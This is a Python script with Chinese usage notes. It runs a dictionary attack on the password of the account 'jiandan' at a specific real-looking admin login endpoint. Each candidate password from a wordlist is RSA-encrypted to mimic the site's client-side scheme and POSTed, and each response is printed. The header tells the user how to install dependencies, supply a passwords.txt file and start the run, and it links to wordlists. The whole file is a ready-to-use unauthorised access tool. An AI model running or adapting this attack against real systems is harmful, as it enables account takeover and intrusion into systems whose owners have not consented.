'''
pip install pycryptodome
然后把你的密码词典命名为passwords.txt，每行一个密码
python3 jiandan.py开始跑吧

字典：https://infocon.org/word%20lists/
'''


import json
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Util.Padding import pad
import base64

# 读取PKCS#8格式的公钥
pkcs8_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnK4eBOfqrww6lqM9kBC
tUZsdmSjvwuTArt8hiwWdxJ1Dljmc9GjD00ezQXcsBHymulNpIesef3VFC4jWSdr
hVwlV4/kaTmtEykAGiWQjTSrb3OdCrRSeSHTV6ZRuXl+xowI32hxF/avqUoOXmga
OTUPNPYa9sDZ6yHZnPKuPZRzIeHyr1PWI2HR+GEylsh4A7I7Rk0XKcS7wG7oZG+N
BibBrhTepgkSKN284yDxE/7zYLxa1k+gbN/XdklnnNutDoZPLdLUeT27RLt7Qphz
6EG/XizjyXja8vU8TqYPfa+oe1d+TvUELRhJ45UizA4fRGq/zm3Ymx/bf0sYm5H4
3MwIDAQAB
-----END PUBLIC KEY-----"""

# 读取密码
with open('passwords.txt', 'r') as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()  # 去除换行符

    # 准备要加密的JSON数据
    data_to_encrypt = {
        "loginAccount": "jiandan",
        "password": password
    }
    json_data = json.dumps(data_to_encrypt)

    # 加密
    public_key = RSA.import_key(pkcs8_public_key)
    cipher = PKCS1_v1_5.new(public_key)
    encrypted_data = cipher.encrypt(pad(json_data.encode(), 128))
    
    # 使用base64编码加密数据
    encrypted_base64 = base64.b64encode(encrypted_data).decode()

    # 设置请求头
    headers = {
        'content-type': 'application/json',
        'encrypt-enable': 'false',
        'encrypt-platform': 'admin',
        'public-encrypt-enable': 'true',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # 发送POST请求
    response = requests.post('https://admin.jiandanchina.com/api/admin/login', headers=headers, data=encrypted_base64)

    # 打印响应
    print(f'密码: {password}, 响应: {response.text}')
